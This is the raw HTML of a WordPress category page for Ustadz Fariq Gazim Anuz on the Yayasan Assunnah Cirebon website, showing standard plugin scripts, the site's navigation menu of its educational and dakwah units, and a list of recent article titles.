<script type="text/javascript" src="https://assunnahcirebon.com/wp-content/plugins/slider-wd/booster/assets/js/global.js?ver=1.0.0" id="twb-global-js"></script>
<script type="text/javascript" src="https://assunnahcirebon.com/wp-content/plugins/advanced-post-slider/js/advps.frnt.script.js?ver=6.8.1" id="advps_front_script-js"></script>
<script type="text/javascript" src="https://assunnahcirebon.com/wp-content/plugins/advanced-post-slider/bxslider/jquery.bxslider.min.js?ver=6.8.1" id="advps_jbx-js"></script>
<script type="text/javascript" id="post_grid_scripts-js-extra">
/* <![CDATA[ */
var post_grid_ajax = {"post_grid_ajaxurl":"https:\/\/assunnahcirebon.com\/wp-admin\/admin-ajax.php"};
/* ]]> */
</script>
<script type="text/javascript" src="https://assunnahcirebon.com/wp-content/plugins/post-grid/assets/frontend/js/scripts.js?ver=6.8.1" id="post_grid_scripts-js"></script>
<script type="application/json" id="wpp-json">

{"sampling_active":0,"sampling_rate":100,"ajax_url":"https:\/\/assunnahcirebon.com\/wp-json\/wordpress-popular-posts\/v1\/popular-posts","api_url":"https:\/\/assunnahcirebon.com\/wp-json\/wordpress-popular-posts","ID":0,"token":"2081c69ac8","lang":0,"debug":0}

</script>
<script type="text/javascript" src="https://assunnahcirebon.com/wp-content/plugins/wordpress-popular-posts/assets/js/wpp.min.js?ver=6.3.4" id="wpp-js-js"></script>
<script type="text/javascript" id="wp-statistics-tracker-js-extra">
/* <![CDATA[ */
var WP_Statistics_Tracker_Object = {"hitRequestUrl":"https:\/\/assunnahcirebon.com\/wp-json\/wp-statistics\/v2\/hit?wp_statistics_hit_rest=yes&track_all=0&current_page_type=category&current_page_id=188&search_query&page_uri=L2NhdGVnb3J5L2Rha3dhaC9qYWR3YWwta2FqaWFuL25hbWEtdXN0YWR6L3VzdGFkei1mYXJpcS1nYXppbS1hbnV6Lw=","keepOnlineRequestUrl":"https:\/\/assunnahcirebon.com\/wp-json\/wp-statistics\/v2\/online?wp_statistics_hit_rest=yes&track_all=0&current_page_type=category&current_page_id=188&search_query&page_uri=L2NhdGVnb3J5L2Rha3dhaC9qYWR3YWwta2FqaWFuL25hbWEtdXN0YWR6L3VzdGFkei1mYXJpcS1nYXppbS1hbnV6Lw=","option":{"dntEnabled":false,"cacheCompatibility":""}};
/* ]]> */
</script>
<script type="text/javascript" src="https://assunnahcirebon.com/wp-content/plugins/wp-statistics/assets/js/tracker.js?ver=6.8.1" id="wp-statistics-tracker-js"></script>
<link rel="https://api.w.org/" href="https://assunnahcirebon.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://assunnahcirebon.com/wp-json/wp/v2/categories/188" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://assunnahcirebon.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.8.1" />

		<style type="text/css" media="screen">
			
		</style>
		<style type="text/css">
.feedzy-rss-link-icon:after {
	content: url("https://assunnahcirebon.com/wp-content/plugins/feedzy-rss-feeds/img/external-link.png");
	margin-left: 3px;
}
</style>
		<script>var ms_grabbing_curosr = 'https://assunnahcirebon.com/wp-content/plugins/master-slider/public/assets/css/common/grabbing.cur', ms_grab_curosr = 'https://assunnahcirebon.com/wp-content/plugins/master-slider/public/assets/css/common/grab.cur';</script>
<meta name="generator" content="MasterSlider 3.9.5 - Responsive Touch Image Slider | avt.li/msf" />
	<style>img#wpstats{display:none}</style>
		            <style id="wpp-loading-animation-styles">@-webkit-keyframes bgslide{from{background-position-x:0}to{background-position-x:-200%}}@keyframes bgslide{from{background-position-x:0}to{background-position-x:-200%}}.wpp-widget-placeholder,.wpp-widget-block-placeholder,.wpp-shortcode-placeholder{margin:0 auto;width:60px;height:3px;background:#dd3737;background:linear-gradient(90deg,#dd3737 0%,#571313 10%,#dd3737 100%);background-size:200% auto;border-radius:3px;-webkit-animation:bgslide 1s infinite linear;animation:bgslide 1s infinite linear}</style>
            <!-- Analytics by WP Statistics v14.2 - https://wp-statistics.com/ -->
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="theme-color" content="#0088ff" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="generator" content="Elementor 3.17.3; features: e_dom_optimization, e_optimized_assets_loading, additional_custom_breakpoints; settings: css_print_method-external, google_font-enabled, font_display-auto">
<!-- All in one Favicon 4.8 --><link rel="shortcut icon" href="http://assunnahcirebon.com/wp-content/uploads/2017/11/ico.ico" />
<link rel="icon" href="https://assunnahcirebon.com/wp-content/uploads/2020/03/cropped-logo-yac-assunnah-PNG-icon-512-1-32x32.png" sizes="32x32" />
<link rel="icon" href="https://assunnahcirebon.com/wp-content/uploads/2020/03/cropped-logo-yac-assunnah-PNG-icon-512-1-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://assunnahcirebon.com/wp-content/uploads/2020/03/cropped-logo-yac-assunnah-PNG-icon-512-1-180x180.png" />
<meta name="msapplication-TileImage" content="https://assunnahcirebon.com/wp-content/uploads/2020/03/cropped-logo-yac-assunnah-PNG-icon-512-1-270x270.png" />
</head>

<body id="tie-body" class="archive category category-ustadz-fariq-gazim-anuz category-188 wp-theme-jannah tie-no-js _masterslider _ms_version_3.9.5 ehf-template-jannah ehf-stylesheet-jannah wrapper-has-shadow block-head-1 magazine1 is-thumb-overlay-disabled is-desktop is-header-layout-3 has-header-ad sidebar-right has-sidebar hide_breaking_news hide_share_post_top hide_share_post_bottom elementor-default elementor-kit-4055">



<div class="background-overlay">

	<div id="tie-container" class="site tie-container">

		
		<div id="tie-wrapper">

			
<header id="theme-header" class="theme-header header-layout-3 main-nav-light main-nav-default-light main-nav-below main-nav-boxed has-stream-item top-nav-active top-nav-light top-nav-default-light top-nav-above has-shadow has-normal-width-logo mobile-header-centered">
	
<nav id="top-nav"  class="has-date-breaking-components top-nav header-nav has-breaking-news" aria-label="Secondary Navigation">
	<div class="container">
		<div class="topbar-wrapper">

			
					<div class="topbar-today-date tie-icon">
						Selasa, Mei 27 2025					</div>
					
			<div class="tie-alignleft">
				
<div class="breaking controls-is-active">

	<span class="breaking-title">
		<span class="tie-icon-bolt breaking-icon" aria-hidden="true"></span>
		<span class="breaking-title-text">Artikel Terbaru</span>
	</span>

	<ul id="breaking-news-in-header" class="breaking-news" data-type="reveal" data-arrows="true">

		
							<li class="news-item">
								<a href="https://assunnahcirebon.com/2025/05/27/agar-istiqomah-dalam-beribadah/">Agar Istiqomah Dalam Beribadah</a>
							</li>

							
							<li class="news-item">
								<a href="https://assunnahcirebon.com/2025/01/10/muhasabah/">Muhasabah</a>
							</li>

							
							<li class="news-item">
								<a href="https://assunnahcirebon.com/2024/08/23/keutamaan-berdakwah-di-jalan-allah/">Keutamaan Berdakwah Di Jalan Allah</a>
							</li>

							
							<li class="news-item">
								<a href="https://assunnahcirebon.com/2024/07/31/urgensi-dan-kutamaan-taubat/">Urgensi Dan Kutamaan Taubat</a>
							</li>

							
							<li class="news-item">
								<a href="https://assunnahcirebon.com/2024/07/26/bahaya-cinta-dunia/">Bahaya Cinta Dunia</a>
							</li>

							
							<li class="news-item">
								<a href="https://assunnahcirebon.com/2024/07/22/menuntut-ilmu-syari-2/">Menuntut Ilmu Syar&#8217;i</a>
							</li>

							
							<li class="news-item">
								<a href="https://assunnahcirebon.com/2021/07/08/%d9%81%d9%82%d9%87-%d8%a7%d9%84%d8%a3%d8%b6%d8%ad%d9%8a%d8%a9/">فقه الأضحية (Fikih Tentang Qurban)</a>
							</li>

							
							<li class="news-item">
								<a href="https://assunnahcirebon.com/2021/06/25/salim-bin-abdullah-bin-umar-bin-khathab/">SALIM BIN ABDULLAH BIN UMAR BIN KHATHAB</a>
							</li>

							
							<li class="news-item">
								<a href="https://assunnahcirebon.com/2021/06/22/isi-waktu-libur-semester-yayasan-as-sunnah-gelar-daurah-al-quran/">Isi Waktu Libur Semester, Yayasan As-Sunnah Gelar Daurah Al-Quran</a>
							</li>

							
							<li class="news-item">
								<a href="https://assunnahcirebon.com/2021/06/07/abu-muslim-al-khaulani-abdullah-bin-tsuwab/">Abu Muslim Al-Khaulani (Abdullah Bin Tsuwab)</a>
							</li>

							
	</ul>
</div><!-- #breaking /-->
			</div><!-- .tie-alignleft /-->

			<div class="tie-alignright">
				<ul class="components">		<li class="search-bar menu-item custom-menu-link" aria-label="Search">
			<form method="get" id="search" action="https://assunnahcirebon.com/">
				<input id="search-input"  inputmode="search" type="text" name="s" title="Search for" placeholder="Search for" />
				<button id="search-submit" type="submit">
					<span class="tie-icon-search tie-search-icon" aria-hidden="true"></span>
					<span class="screen-reader-text">Search for</span>
				</button>
			</form>
		</li>
		 <li class="social-icons-item"><a class="social-link instagram-social-icon" rel="external noopener nofollow" target="_blank" href="https://www.instagram.com/assunnahcirebonofficial/"><span class="tie-social-icon tie-icon-instagram"></span><span class="screen-reader-text">Instagram</span></a></li><li class="social-icons-item"><a class="social-link youtube-social-icon" rel="external noopener nofollow" target="_blank" href="https://www.youtube.com/c/PonpesAssunnahCirebon"><span class="tie-social-icon tie-icon-youtube"></span><span class="screen-reader-text">YouTube</span></a></li><li class="social-icons-item"><a class="social-link twitter-social-icon" rel="external noopener nofollow" target="_blank" href="https://twitter.com/Assunnah_Crb"><span class="tie-social-icon tie-icon-twitter"></span><span class="screen-reader-text">Twitter</span></a></li><li class="social-icons-item"><a class="social-link facebook-social-icon" rel="external noopener nofollow" target="_blank" href="https://www.facebook.com/assunnahcirebonofficial/"><span class="tie-social-icon tie-icon-facebook"></span><span class="screen-reader-text">Facebook</span></a></li> </ul><!-- Components -->			</div><!-- .tie-alignright /-->

		</div><!-- .topbar-wrapper /-->
	</div><!-- .container /-->
</nav><!-- #top-nav /-->

<div class="container header-container">
	<div class="tie-row logo-row">

		
		<div class="logo-wrapper">
			<div class="tie-col-md-4 logo-container clearfix">
				<div id="mobile-header-components-area_1" class="mobile-header-components"><ul class="components"><li class="mobile-component_menu custom-menu-link"><a href="#" id="mobile-menu-icon" class=""><span class="tie-mobile-menu-icon nav-icon is-layout-4"></span><span class="screen-reader-text">Menu</span></a></li></ul></div>
		<div id="logo" class="image-logo" >

			
			<a title="Yayasan Assunnah Cirebon" href="https://assunnahcirebon.com/">
				
				<picture class="tie-logo-default tie-logo-picture">
					<source class="tie-logo-source-default tie-logo-source" srcset="https://assunnahcirebon.com/wp-content/uploads/2023/05/header-png.png">
					<img class="tie-logo-img-default tie-logo-img" src="https://assunnahcirebon.com/wp-content/uploads/2023/05/header-png.png" alt="Yayasan Assunnah Cirebon" width="5996" height="1984" style="max-height:1984px; width: auto;" />
				</picture>
						</a>

			
		</div><!-- #logo /-->

		<div id="mobile-header-components-area_2" class="mobile-header-components"><ul class="components"><li class="mobile-component_search custom-menu-link">
				<a href="#" class="tie-search-trigger-mobile">
					<span class="tie-icon-search tie-search-icon" aria-hidden="true"></span>
					<span class="screen-reader-text">Search for</span>
				</a>
			</li> <li class="mobile-component_skin custom-menu-link">
				<a href="#" class="change-skin" title="Switch skin">
					<span class="tie-icon-moon change-skin-icon" aria-hidden="true"></span>
					<span class="screen-reader-text">Switch skin</span>
				</a>
			</li></ul></div>			</div><!-- .tie-col /-->
		</div><!-- .logo-wrapper /-->

		<div class="tie-col-md-8 stream-item stream-item-top-wrapper"><div class="stream-item-top">
					<a href="https://ppdb.assunnahcirebon.com" title="" target="_blank" rel="nofollow noopener">
						<img src="https://assunnahcirebon.com/wp-content/uploads/2024/09/PPDB-HEADER.png" alt="" width="700" height="140" />
					</a>
				</div></div><!-- .tie-col /-->
	</div><!-- .tie-row /-->
</div><!-- .container /-->

<div class="main-nav-wrapper">
	<nav id="main-nav"  class="main-nav header-nav"  aria-label="Primary Navigation">
		<div class="container">

			<div class="main-menu-wrapper">

				
				<div id="menu-components-wrap">

					
					<div class="main-menu main-menu-wrap tie-alignleft">
						<div id="main-nav-menu" class="main-menu header-menu"><ul id="menu-beranda" class="menu" role="menubar"><li id="menu-item-3974" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-3974"><a href="https://assunnahcirebon.com/">BERANDA</a></li>
<li id="menu-item-460" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-460"><a href="https://assunnahcirebon.com/profil/">PROFIL</a></li>
<li id="menu-item-459" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-459"><a href="https://assunnahcirebon.com/pendidikan/">BIDANG PENDIDIKAN</a>
<ul class="sub-menu menu-sub-content">
	<li id="menu-item-1702" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-1702"><a href="https://assunnahcirebon.com/play-group/">Play Group</a>
	<ul class="sub-menu menu-sub-content">
		<li id="menu-item-2289" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2289"><a href="https://assunnahcirebon.com/profil-play-group/">Profil Play Group</a></li>
		<li id="menu-item-1696" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1696"><a href="https://assunnahcirebon.com/category/pendidikan/play-group/kegiatan-play-group/">Kegiatan Play Group</a></li>
	</ul>
</li>
	<li id="menu-item-1704" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-1704"><a href="https://assunnahcirebon.com/tkit/">TKIT</a>
	<ul class="sub-menu menu-sub-content">
		<li id="menu-item-2210" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2210"><a href="https://assunnahcirebon.com/tkit-assunnah/">Profil TKIT</a></li>
		<li id="menu-item-1681" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1681"><a href="https://assunnahcirebon.com/category/pendidikan/tkit/kegiatan-tkit/">Kegiatan TKIT</a></li>
	</ul>
</li>
	<li id="menu-item-1703" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-1703"><a href="https://assunnahcirebon.com/sdit/">SDIT</a>
	<ul class="sub-menu menu-sub-content">
		<li id="menu-item-2293" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2293"><a href="https://assunnahcirebon.com/profil-sdit/">Profil SDIT</a></li>
		<li id="menu-item-1698" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1698"><a href="https://assunnahcirebon.com/category/pendidikan/sdit/kegiatan-sdit/">Kegiatan SDIT</a></li>
	</ul>
</li>
	<li id="menu-item-1701" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-1701"><a href="https://assunnahcirebon.com/mts/">MTs</a>
	<ul class="sub-menu menu-sub-content">
		<li id="menu-item-2297" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2297"><a href="https://assunnahcirebon.com/profil-mts/">Profil MTs</a></li>
		<li id="menu-item-1694" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1694"><a href="https://assunnahcirebon.com/category/pendidikan/mts-unit/kegiatan-mts/">Kegiatan MTs</a></li>
	</ul>
</li>
	<li id="menu-item-1736" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-1736"><a href="https://assunnahcirebon.com/idad-lughoh/">Idad Lughoh</a>
	<ul class="sub-menu menu-sub-content">
		<li id="menu-item-2306" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2306"><a href="https://assunnahcirebon.com/profil-idad-lugoh/">Profil I’dad Lugoh</a></li>
		<li id="menu-item-1690" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1690"><a href="https://assunnahcirebon.com/category/pendidikan/idad-lughoh/kegiatan-idad-lugoh/">Kegiatan I&#8217;dad Lugoh</a></li>
	</ul>
</li>
	<li id="menu-item-1700" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-1700"><a href="https://assunnahcirebon.com/ma/">MA</a>
	<ul class="sub-menu menu-sub-content">
		<li id="menu-item-2304" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2304"><a href="https://assunnahcirebon.com/profil-ma/">Profil MA</a></li>
		<li id="menu-item-1692" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1692"><a href="https://assunnahcirebon.com/category/pendidikan/ma/kegiatan-ma/">Kegiatan MA</a></li>
	</ul>
</li>
	<li id="menu-item-2360" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-2360"><a href="https://assunnahcirebon.com/mahad-aly/">Ma&#8217;had Aly Assunnah</a>
	<ul class="sub-menu menu-sub-content">
		<li id="menu-item-2344" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2344"><a href="https://assunnahcirebon.com/profil-mahad-aly/">Profil</a></li>
		<li id="menu-item-2487" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2487"><a href="https://assunnahcirebon.com/category/dakwah/kegiatan-mahad-aly/">Kegiatan</a></li>
	</ul>
</li>
</ul>
</li>
<li id="menu-item-458" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-458"><a href="https://assunnahcirebon.com/dakwah/">BIDANG DAKWAH</a>
<ul class="sub-menu menu-sub-content">
	<li id="menu-item-2247" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-2247"><a href="https://assunnahcirebon.com/artikel/">Artikel</a>
	<ul class="sub-menu menu-sub-content">
		<li id="menu-item-1646" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1646"><a href="https://assunnahcirebon.com/category/artikel/aqidah/">Aqidah</a></li>
		<li id="menu-item-4655" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4655"><a href="https://assunnahcirebon.com/category/artikel/manhaj/">Manhaj</a></li>
		<li id="menu-item-1670" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1670"><a href="https://assunnahcirebon.com/category/artikel/tafsir-al-quran/">Tafsir Al-Qur&#8217;an</a></li>
		<li id="menu-item-4654" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4654"><a href="https://assunnahcirebon.com/category/artikel/hadits/">Hadits</a></li>
		<li id="menu-item-1669" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1669"><a href="https://assunnahcirebon.com/category/artikel/akhlak-dan-adab/">Akhlak &amp; Adab</a></li>
		<li id="menu-item-1671" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1671"><a href="https://assunnahcirebon.com/category/artikel/fiqih/">Fiqih</a></li>
		<li id="menu-item-2052" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2052"><a href="https://assunnahcirebon.com/category/artikel/kisah/">Kisah</a></li>
		<li id="menu-item-2250" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2250"><a href="https://assunnahcirebon.com/category/artikel/tematik/">Tematik</a></li>
		<li id="menu-item-4656" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4656"><a href="https://assunnahcirebon.com/category/artikel/muslimah/">Muslimah</a></li>
		<li id="menu-item-2053" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2053"><a href="https://assunnahcirebon.com/category/artikel/mutiara-nasihat/">Mutiara Nasihat</a></li>
		<li id="menu-item-3504" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3504"><a href="https://assunnahcirebon.com/poster-nasihat/">Poster Nasihat</a></li>
	</ul>
</li>
	<li id="menu-item-2035" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-2035"><a href="https://assunnahcirebon.com/jadwal-kajian/">Jadwal Kajian</a>
	<ul class="sub-menu menu-sub-content">
		<li id="menu-item-2036" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2036"><a href="https://assunnahcirebon.com/daerah/">Daerah</a></li>
		<li id="menu-item-2039" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2039"><a href="https://assunnahcirebon.com/tempat/">Tempat</a></li>
		<li id="menu-item-2034" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2034"><a href="https://assunnahcirebon.com/nama-ustadz/">Nama Ustadz</a></li>
		<li id="menu-item-2037" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2037"><a href="https://assunnahcirebon.com/hari/">Hari</a></li>
		<li id="menu-item-2038" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2038"><a href="https://assunnahcirebon.com/waktu/">Waktu</a></li>
		<li id="menu-item-2050" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2050"><a href="https://assunnahcirebon.com/category/dakwah/jadwal-kajian/umum/">Umum</a></li>
		<li id="menu-item-2041" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2041"><a href="https://assunnahcirebon.com/category/dakwah/jadwal-kajian/khusus-akhwat/">Khusus Akhwat</a></li>
		<li id="menu-item-2042" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2042"><a href="https://assunnahcirebon.com/category/dakwah/jadwal-kajian/khusus-ikhwan/">Khusus Ikhwan</a></li>
	</ul>
</li>
	<li id="menu-item-2159" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-2159"><a href="https://assunnahcirebon.com/forum-silaturahmi-ummahat/">Forum Silaturahmi Ummahat</a>
	<ul class="sub-menu menu-sub-content">
		<li id="menu-item-2345" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2345"><a href="https://assunnahcirebon.com/profil-forum-silaturahmi-ummahat/">Profil Forum Silaturahmi Ummahat</a></li>
		<li id="menu-item-2358" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2358"><a href="https://assunnahcirebon.com/category/dakwah/kegiatan-forum-silaturahmi-ummahat/">Kegiatan Forum Silaturahmi Ummahat</a></li>
	</ul>
</li>
	<li id="menu-item-2449" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-2449"><a href="https://assunnahcirebon.com/pesantren-mahasiswa-pasma-2/">Pesantren Mahasiswa (PASMA)</a>
	<ul class="sub-menu menu-sub-content">
		<li id="menu-item-2342" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2342"><a href="https://assunnahcirebon.com/profil-pesantren-mahasiswa/">Profil Pesantren Mahasiswa</a></li>
		<li id="menu-item-1688" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1688"><a href="https://assunnahcirebon.com/category/dakwah/pesantren-mahasiswa-pasma/">Kegiatan Pesantren Mahasiswa (PASMA)</a></li>
	</ul>
</li>
	<li id="menu-item-2456" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-2456"><a href="https://assunnahcirebon.com/majlis-usroh-al-islami-musi/">Majlis Usroh Al-Islami (MUSI)</a>
	<ul class="sub-menu menu-sub-content">
		<li id="menu-item-2341" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2341"><a href="https://assunnahcirebon.com/profil-majlis-usroh-al-islami/">Profil Majlis Usroh Al Islami</a></li>
		<li id="menu-item-1687" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1687"><a href="https://assunnahcirebon.com/category/dakwah/majlis-usroh-al-islami-musi/">Kegiatan Majlis Usroh Al Islami (MUSI)</a></li>
	</ul>
</li>
	<li id="menu-item-2310" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2310"><a href="https://assunnahcirebon.com/profil-tarbiyatun-nisaa/">Tarbiyatun Nisaa</a></li>
	<li id="menu-item-644" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-644"><a href="https://assunnahcirebon.com/category/dakwah/tabligh-akbar/">Tabligh Akbar</a></li>
</ul>
</li>
<li id="menu-item-1175" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-1175"><a href="https://assunnahcirebon.com/category/sosial-dan-ekonomi/bakti-sosial/">BIDANG SOSIAL</a>
<ul class="sub-menu menu-sub-content">
	<li id="menu-item-4753" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4753"><a href="https://assunnahcirebon.com/category/assunnah-peduli/">Assunnah Peduli</a></li>
	<li id="menu-item-2049" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2049"><a href="https://assunnahcirebon.com/category/sosial-dan-ekonomi/santunan-anak-yatim/">Santunan Anak Yatim</a></li>
	<li id="menu-item-2048" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2048"><a href="https://assunnahcirebon.com/category/sosial-dan-ekonomi/penyaluran-hewan-qurban/">Penyaluran Hewan Qurban</a></li>
</ul>
</li>
<li id="menu-item-457" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-457"><a href="https://assunnahcirebon.com/ekonomi/">BIDANG EKONOMI</a>
<ul class="sub-menu menu-sub-content">
	<li id="menu-item-2671" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2671"><a href="https://assunnahcirebon.com/assunnah-mart-kantin/">Assunnah Mart dan Kantin</a></li>
	<li id="menu-item-2134" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2134"><a href="https://assunnahcirebon.com/paket/">Paket</a></li>
	<li id="menu-item-2676" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2676"><a href="https://assunnahcirebon.com/konveksi-assunnah/">Konveksi Assunnah</a></li>
	<li id="menu-item-2677" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2677"><a href="https://assunnahcirebon.com/laundry-assunnah/">Laundry Assunnah</a></li>
	<li id="menu-item-2673" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2673"><a href="https://assunnahcirebon.com/depot-air-moyashihi/">Depot Air Moyashihi</a></li>
</ul>
</li>
<li id="menu-item-4752" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-4752"><a href="https://assunnahcirebon.com/bidang-umum/">BIDANG UMUM</a>
<ul class="sub-menu menu-sub-content">
	<li id="menu-item-6257" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6257"><a href="https://assunnahcirebon.com/category/dakwah/jadwal-kajian/umum/klinik-permata-sunnah/">Klinik Permata Sunnah</a></li>
	<li id="menu-item-2146" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2146"><a href="https://assunnahcirebon.com/bmt-mitra-usaha-assunnah/">BMT Mitra Usaha Assunnah</a></li>
	<li id="menu-item-2674" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2674"><a href="https://assunnahcirebon.com/k3-dan-sarpras/">K3 dan Sarpras</a></li>
</ul>
</li>
</ul></div>					</div><!-- .main-menu.tie-alignleft /-->

					<ul class="components">	<li class="skin-icon menu-item custom-menu-link">
		<a href="#" class="change-skin" title="Switch skin">
			<span class="tie-icon-moon change-skin-icon" aria-hidden="true"></span>
			<span class="screen-reader-text">Switch skin</span>
		</a>
	</li>
	</ul><!-- Components -->
				</div><!-- #menu-components-wrap /-->
			</div><!-- .main-menu-wrapper /-->
		</div><!-- .container /-->
	</nav><!-- #main-nav /-->
</div><!-- .main-nav-wrapper /-->

</header>

		<script type="text/javascript">
			try{if("undefined"!=typeof localStorage){var header,mnIsDark=!1,tnIsDark=!1;(header=document.getElementById("theme-header"))&&((header=header.classList).contains("main-nav-default-dark")&&(mnIsDark=!0),header.contains("top-nav-default-dark")&&(tnIsDark=!0),"dark"==tieSkin?(header.add("main-nav-dark","top-nav-dark"),header.remove("main-nav-light","top-nav-light")):"light"==tieSkin&&(mnIsDark||(header.remove("main-nav-dark"),header.add("main-nav-light")),tnIsDark||(header.remove("top-nav-dark"),header.add("top-nav-light"))))}}catch(a){console.log(a)}
		</script>
		<link rel='stylesheet' id='tie-css-styles-css' href='https://assunnahcirebon.com/wp-content/themes/jannah/assets/css/style.min.css' type='text/css' media='all' />
<script>console.log('Style tie-css-styles')</script>
<div id="content" class="site-content container"><div id="main-content-row" class="tie-row main-content-row">
	<div class="main-content tie-col-md-8 tie-col-xs-12" role="main">

		
			<header class="entry-header-outer container-wrapper">
				<nav id="breadcrumb"><a href="https://assunnahcirebon.com/"><span class="tie-icon-home" aria-hidden="true"></span> Home</a><em class="delimiter">/</em><a href="https://assunnahcirebon.com/category/dakwah/">DAKWAH</a><em class="delimiter">/</em><a href="https://assunnahcirebon.com/category/dakwah/jadwal-kajian/">Jadwal Kajian</a><em class="delimiter">/</em><a href="https://assunnahcirebon.com/category/dakwah/jadwal-kajian/nama-ustadz/">NAMA USTADZ</a><em class="delimiter">/</em><span class="current">Ustadz Fariq Gazim Anuz</span></nav><script type="application/ld+json">{"@context":"http:\/\/schema.org","@type":"BreadcrumbList","@id":"#Breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"item":{"name":"Home","@id":"https:\/\/assunnahcirebon.com\/"}},{"@type":"ListItem","position":2,"item":{"name":"DAKWAH","@id":"https:\/\/assunnahcirebon.com\/category\/dakwah\/"}},{"@type":"ListItem","position":3,"item":{"name":"Jadwal Kajian","@id":"https:\/\/assunnahcirebon.com\/category\/dakwah\/jadwal-kajian\/"}},{"@type":"ListItem","position":4,"item":{"name":"NAMA USTADZ","@id":"https:\/\/assunnahcirebon.com\/category\/dakwah\/jadwal-kajian\/nama-ustadz\/"}}]}</script><h1 class="page-title">Ustadz Fariq Gazim Anuz</h1>			</header><!-- .entry-header-outer /-->

			
		<div class="mag-box wide-post-box">
			<div class="container-wrapper">
				<div class="mag-box-container clearfix">
					<ul id="posts-container" data-layout="default" data-settings="{'uncropped_image':'jannah-image-post','category_meta':false,'post_meta':true,'excerpt':'true','excerpt_length':'20','read_more':'true','read_more_text':false,'media_overlay':false,'title_length':0,'is_full':false,'is_category':true}" class="posts-items">
<li class="post-item  post-4883 post type-post status-publish format-standard has-post-thumbnail category-cirebon-kota category-jadwal-kajian category-masjid-asyafiie-bayasut category-senin category-umum category-ustadz-fariq-gazim-anuz tie-standard">

	
